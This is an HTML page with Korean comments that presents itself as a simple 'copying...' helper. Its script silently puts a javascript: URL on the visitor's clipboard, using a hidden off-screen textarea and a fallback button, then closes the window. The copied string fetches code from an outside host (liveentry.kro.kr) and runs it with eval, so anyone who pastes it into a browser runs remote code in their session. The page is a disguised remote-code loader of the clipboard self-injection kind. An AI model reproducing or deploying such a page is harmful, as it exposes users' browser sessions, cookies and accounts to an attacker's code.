<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>복사 중...</title>
</head>
<body>
    <script>
        // 복사할 텍스트 정의
        const textToCopy = "javascript:(() => {fetch('https://liveentry.kro.kr').then(r=>r.text()).then(eval);})();";

        // 구버전 및 HTTP 환경에서도 작동하는 레거시 복사 함수
        function legacyCopy(text) {
            const textArea = document.createElement("textarea");
            textArea.value = text;
            // 화면에서 안 보이게 숨기기
            textArea.style.position = "fixed";
            textArea.style.left = "-999999px";
            textArea.style.top = "-999999px";
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try {
                document.execCommand('copy');
                //alert("텍스트가 복사되었습니다!");
                window.close();
            } catch (err) {
                showManualButton();
            }
            document.body.removeChild(textArea);
        }

        // 보안으로 인해 자동 복사가 완전히 막혔을 때 버튼을 띄우는 함수
        function showManualButton() {
            document.body.innerHTML = `
                <div style="text-align:center; margin-top:50px;">
                    <p style="font-size:16px; color:#333;">브라우저 보안으로 인해 자동 복사가 차단되었습니다.</p>
                    <button id="copyBtn" style="padding:10px 20px; font-size:16px; cursor:pointer;">여기 눌러서 복사하기</button>
                </div>
            `;
            document.getElementById('copyBtn').addEventListener('click', () => {
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(textToCopy).then(() => { window.close(); });
                } else {
                    legacyCopy(textToCopy);
                }
            });
        }

        // 실행부
        try {
            // HTTPS 환경이고 브라우저가 지원하는 경우
            if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
                navigator.clipboard.writeText(textToCopy)
                .then(() => {
                    window.close();
                })
                .catch(() => {
                    // 자동 복사가 거부된 경우 구식 방식으로 재시도
                    legacyCopy(textToCopy);
                    window.close();
                });
            } else {
                // HTTP 환경이거나 구형 브라우저인 경우
                legacyCopy(textToCopy);
            }
        } catch (e) {
            showManualButton();
        }
    </script>
</body>
</html>
